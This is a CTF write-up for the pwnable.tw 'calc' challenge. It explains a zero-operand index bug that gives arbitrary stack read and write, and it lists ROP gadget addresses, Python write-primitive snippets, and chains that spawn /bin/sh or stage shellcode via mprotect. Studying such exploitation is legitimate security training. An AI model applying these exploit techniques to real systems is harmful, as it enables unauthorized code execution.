---
tags:
  - integer-underflow
  - stack-buffer-overflow
  - rop
  - static-binary
platform: pwnable.tw
points: 150
arch: i386
libc: static
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An integer underflow in arithmetic expression token indexing allows arbitrary stack read and write, enabling ROP chain construction on the return address."
proof-of-concept: no
---

# calc — pwnable.tw (150 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10100`
>
> Flag: `FLAG{C:\Windows\System32\calc.exe}`

## Challenge Overview

A statically linked, 32-bit calculator binary that evaluates arithmetic expressions. The user enters expressions like `1+2*3`, and the program prints the result. It supports `+`, `-`, `*`, `/`, and `%`. Input is read line-by-line; an empty line exits the calculator.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed base 0x08048000
  Linking:  Statically linked     # no libc.so — all gadgets in binary
```

The binary is **not stripped** — symbols like `calc`, `parse_expr`, `eval`, `get_expr`, `init_pool` are visible.

## Architecture

### `calc()` — main calculator loop

```
calc():
  sub  esp, 0x5b8
  canary = gs:0x14             // stack canary at ebp-0xc
  pool[0..0x161]               // operand pool at ebp-0x5a0 (int pool[0x162])
                               // pool[0] = count, pool[1..N] = operands
  input_buf[0x400]             // at ebp-0x40c

  loop:
    bzero(input_buf, 0x400)
    if (!get_expr(input_buf, 0x400)) return
    init_pool(pool)            // pool[0] = 0
    if (parse_expr(input_buf, pool))
      printf("%d\n", pool[pool[0]])   // print top of operand stack
```

### `parse_expr(expr, pool)` — expression parser

Walks the expression string character by character. When it encounters a digit sequence, it calls `atoi()` on it and pushes the value onto the operand pool. When it encounters an operator (`+`, `-`, `*`, `/`, `%`), it calls `eval(pool, op)` to fold the top two operands.

**Critical code path** — when a number is parsed:

```c
num = atoi(token);
if (num > 0) {           // <-- BUG: skips push when num == 0
    pool[0]++;
    pool[pool[0]] = num;  // push operand
}
```

### `eval(pool, op)` — evaluate operator

Takes the top two operands from the pool, applies the operator, stores the result, and decrements the count:

```c
// For '+':
pool[pool[0]-2] = pool[pool[0]-2] + pool[pool[0]-1];
pool[0]--;    // pop one operand
```

Equivalent pseudocode for all operators — `eval` accesses `pool[pool[0]-2]` and `pool[pool[0]-1]`, combines them, stores at `pool[pool[0]-2]`, then decrements `pool[0]`.

## Vulnerability

### V1 — Operand Pool Index Manipulation via Zero-Value Numbers (Primary, Exploitable)

**Root Cause:** When `atoi()` returns 0 (e.g., from the token `"00"`), `parse_expr` does **not** push a value onto the pool, but `eval` still executes the operator against `pool[pool[0]-1]` and `pool[pool[0]-2]`. This mismatch allows the pool index (`pool[0]`) to go **negative** (or be driven to any value), enabling reads and writes to arbitrary stack offsets relative to the pool base.

```c
// parse_expr — the zero-push bug
num = atoi(substring);
if (num > 0) {         // 0 is NOT pushed — pool[0] stays the same
    pool[0]++;
    pool[pool[0]] = num;
}
// ... then eval() is called, which does pool[0]-- regardless
```

**Why this matters:** The pool lives on `calc()`'s stack at `ebp - 0x5a0`. By manipulating `pool[0]`, we can make `eval` read/write to `pool[pool[0] - 1]` which resolves to any stack address — including the **saved return address** of `calc()` and beyond.

**Trigger — Reading a stack slot:**

Sending `+N` (where N is a positive integer) causes:
1. `atoi("N")` → push N onto pool → `pool[0] = 1`, `pool[1] = N`
2. No more operands/operators → `printf("%d\n", pool[pool[0]])` → prints `pool[1]` = N

But sending `+360` with the right expression structure makes `eval` compute `pool[pool[0]-2] + pool[pool[0]-1]` where the index puts us at the saved EBP/EIP area. The result is printed — **leaking stack values**.

**Trigger — Writing a stack slot:**

Sending `+361+<value>` causes eval to write `pool[360] + <value>` back to `pool[360]`, which is the saved return address of `calc()`. By first reading the current value and computing the needed delta, we can set it to any desired value.

### Key Offsets

The pool is at `ebp - 0x5a0`, and the saved return address is at `ebp + 4`:

```
pool[0]   = ebp - 0x5a0          // operand count
pool[1]   = ebp - 0x59c          // first operand
...
pool[360] = ebp - 0x5a0 + 360*4 = ebp + 0x20  (saved EBP of calc)
pool[361] = ebp + 0x24           (saved EIP / return address of calc)
pool[362] = ebp + 0x28           (first ROP slot after return)
...
```

So **index 361** is the return address of `calc()`. Some solutions use 360 for the saved EBP and 357 for the canary.

### V2 — Stack Canary Leak

Since the canary is at `ebp - 0xc`, it's at pool index `(0x5a0 - 0xc) / 4 = 357`. By reading `+357`, the canary value is leaked. However, **most solutions don't need to leak or overwrite the canary** because they write the ROP chain starting at pool[361] (past the canary check) — `calc()` checks the canary, but if we only write from pool[361] onward (the return address and beyond), the canary at `ebp-0xc` is untouched.

## Exploit Paths

All solutions exploit V1 to write a ROP chain onto the stack starting at the return address of `calc()`. They diverge on which syscall approach and which ROP gadgets they use.

---

### Path A — `execve("/bin/sh", 0, 0)` via `int 0x80` ROP Chain

**Used by:** Majority of solutions (~80%+)

Since the binary is **statically linked**, it contains a rich set of ROP gadgets. The standard approach:

1. **Write "/bin/sh" somewhere:** Either on the stack itself (at known offsets past the ROP chain) or to a writable `.data`/`.bss` section using `mov [edx], eax ; ret` gadgets.

2. **Set registers for `execve` syscall:**
   - `eax = 0xb` (syscall number for `execve`)
   - `ebx = pointer to "/bin/sh"`
   - `ecx = 0` (or pointer to argv array)
   - `edx = 0` (envp)

3. **Trigger `int 0x80`.**

4. **Exit calculator** by sending an empty line, which causes `calc()` to return → ROP chain executes.

**Common gadgets used:**

```python
pop_eax     = 0x0805c34b   # pop eax ; ret
pop_edx     = 0x080701aa   # pop edx ; ret
pop_ecx_ebx = 0x080701d1   # pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x080701d0  # pop edx ; pop ecx ; pop ebx ; ret
int_0x80    = 0x08049a21   # int 0x80
mov_mem_eax = 0x0809b30d   # mov dword ptr [edx], eax ; ret
xor_eax     = 0x080550d0   # xor eax, eax ; ret
inc_eax     = 0x0807cb7f   # inc eax ; ret
```

**Sub-variant A1 — Write "/bin/sh" to .data, then execve:**

Write "/bin//sh" to `.data` (0x080ec060) using `pop edx; ret` + `pop eax; ret` + `mov [edx], eax; ret` gadget chain. Then set up registers and `int 0x80`. This is the ROPgadget `--ropchain` output and used by the majority of solutions.

**Sub-variant A2 — Write "/bin/sh" directly on the stack:**

Place "/bin/sh\0" at a known stack offset (e.g., pool[369-370]) and point `ebx` to it. Requires leaking the stack address first (via reading pool[360] to get saved EBP).

**Sub-variant A3 — Use `inc eax` to build syscall number:**

Instead of `pop eax; 0xb`, use `xor eax, eax; ret` followed by 11× `inc eax; ret` to avoid large immediate values.

---

### Path B — `mprotect` + `read` → Shellcode Execution

**Used by:** Solutions 1172, 1236, 1351, 1387, 1428, 10178

1. **ROP to `mprotect(bss_page, 0x1000, 7)`** — makes a BSS/data page executable.
2. **ROP to `read(0, bss_addr, size)`** — reads shellcode from stdin into the now-executable page.
3. **Pivot execution to BSS** — either via `pop esp; ret` or `jmp bss`.
4. **Send shellcode** as the second stage payload.

```python
# Typical layout
mprotect = 0x0806f1f0
read     = 0x0806e6d0
pppr     = 0x080701a8    # pop esi; pop ebx; pop edx; ret (to clean args)
bss      = 0x080ed000    # page-aligned BSS
```

---

### Path C — Single-Expression Exploit (No Per-Slot Writes)

**Used by:** Solutions 1155, 1200, 11540, 10178

Instead of sending one expression per ROP slot, craft a **single long expression** that writes the entire ROP chain in one shot. This exploits the fact that the `%` (modulo) or `*` (multiply) operators combined with operand index manipulation can position values precisely.

Techniques:
- **`+N%00` trick:** `+N%00` evaluates to `pool[current_idx] % 0` but since `atoi("00") = 0` doesn't push, `eval` operates on existing pool entries, effectively decrementing the index. Repeating this "walks backward" through the pool.
- **Single-line chain encoding:** Express the entire ROP chain as one arithmetic expression using `+val1*1+val2*1+...` patterns.

---

### Path D — Stack Pivot to Deeper ROP

**Used by:** Solution 100

1. **Leak the stack address** via `+360` (saved EBP).
2. **Write a large ROP chain** deep in the stack (at offsets 516/4 = 129+).
3. **Write a stack pivot** (`xchg eax, esp; ret`) at the return address to redirect execution to the deep chain.

## Write Primitive Details

All solutions need to write 32-bit values to specific pool indices. The main techniques:

### Technique 1 — Read-then-delta (most common)

```python
# Read current value at pool[idx]
sendline("+{idx}")
old = int(recvline())
# Write desired value
delta = desired - old
sendline("+{idx}+{delta}" if delta >= 0 else "+{idx}{delta}")
```

### Technique 2 — Zero-then-set

```python
# Zero the slot first using division
sendline("*{idx}/{MAX_INT}")  # pool[idx] * MAX_INT / MAX_INT ≈ 0
sendline("*{idx}/{MAX_INT}")  # repeat to ensure zero
sendline("*{idx}+{value}")    # then add desired value
```

### Technique 3 — Direct addition (when starting from known zero)

```python
sendline("+{idx}+{value}")    # works when pool[idx] starts at 0
```

## Exploit Primitive Summary

| Primitive | Mechanism | Reliability |
|-----------|-----------|-------------|
| Arbitrary stack read | `+N` with crafted index → `printf` output | Deterministic |
| Arbitrary stack write | `+N+delta` / `+N-delta` after reading | Deterministic |
| Stack canary leak | Read pool[357] | Deterministic (usually not needed) |
| Saved EBP leak | Read pool[360] | Deterministic |
| Code execution | ROP chain at pool[361+] → `calc` returns into it | Deterministic |

## Key Gadgets (in the static binary)

```python
pop_eax_ret          = 0x0805c34b
pop_ebx_ret          = 0x080481d1
pop_ecx_ebx_ret      = 0x080701d1
pop_edx_ret          = 0x080701aa
pop_edx_ecx_ebx_ret  = 0x080701d0
xor_eax_ret          = 0x080550d0
inc_eax_ret          = 0x0807cb7f
mov_edx_eax_ret      = 0x0809b30d   # mov [edx], eax; ret
int_0x80             = 0x08049a21
int_0x80_ret         = 0x08070880   # int 0x80; ret

# For shellcode path
mprotect             = 0x0806f1f0
read                 = 0x0806e6d0
pop_esi_ebx_edx_ret  = 0x080701a8
pop_esp_ret          = 0x080bc4f6

# Writable sections
data_section         = 0x080ec060
bss_section          = 0x080ed000
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `exp.py` | A1 | Zero-then-set write, execve via int 0x80 | Reference exploit |
| `138.md` | A2 | Stack-based /bin/sh, leak EBP for address | Ruby; uses xor edx gadgets |
| `100.md` | D | Stack pivot, ROP deep in stack | Leak stack addr first |
| `1140.md` | A1 | Direct overwrite via signed arithmetic | Writes to absolute addresses |
| `1155.md` | A1 | Minimal chain with add-delta | Short and clean |
| `1172.md` | B | mprotect + shellcode injection | Classic two-stage |
| `1200.md` | C | Single long expression | Uses `+val*val` encoding in one line |
| `1220.md` | A2 | Leak EBP, place /bin/sh on stack | Read-then-delta write |
| `1225.md` | A1 | `*idx%val` write primitive | ROPgadget --ropchain output |
| `1236.md` | B | mprotect + read + shellcode | Standard two-stage |
| `1259.md` | A2 | Stack /bin/sh, leak EBP | Uses xor_ecx/xor_edx gadgets |
| `1303.md` | A1 | ROPgadget chain, read-delta writes | Clean implementation |
| `1351.md` | B | mprotect + read → shellcode | Minimal |
| `1387.md` | A2 | autorop + stack leak | Uses autorop library |
| `1428.md` | B | mprotect + stack shellcode | Writes shellcode as ints |
| `10068.md` | A2 | Leak EBP, /bin/sh on stack | pop_eax + pop_dcb + int80 |
| `10115.md` | A2 | Canary + EBP leak, BSS /bin/sh | Writes to BSS via ROP |
| `10178.md` | C | Single-expression via `%1` chain | Entire chain in one send |
| `10302.md` | A2 | Leak EBP, /bin/sh on stack | Uses signed arithmetic carefully |
| `11540.md` | A1 | `*val` encoding, two-stage (read) | Writes chain via multiplication |
| `12245.md` | A1 | ROPgadget chain, .data /bin/sh | Chinese writeup with explanation |
| `13484.md` | A2 | Write /bin/sh in pool, compute ebx | Clean read-delta approach |
| `13757.md` | A1 | Automated chain generator | ROPgadget-based |
| `14605.md` | A1 | ROPgadget chain verbatim | Standard approach |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (zero-then-set + execve ROP) |
| `desc.txt` | Challenge description |
| `artifacts/calc` | Original challenge binary (i386, static, not stripped) |
| `solution/*.md` | Community write-ups (196 solutions) |
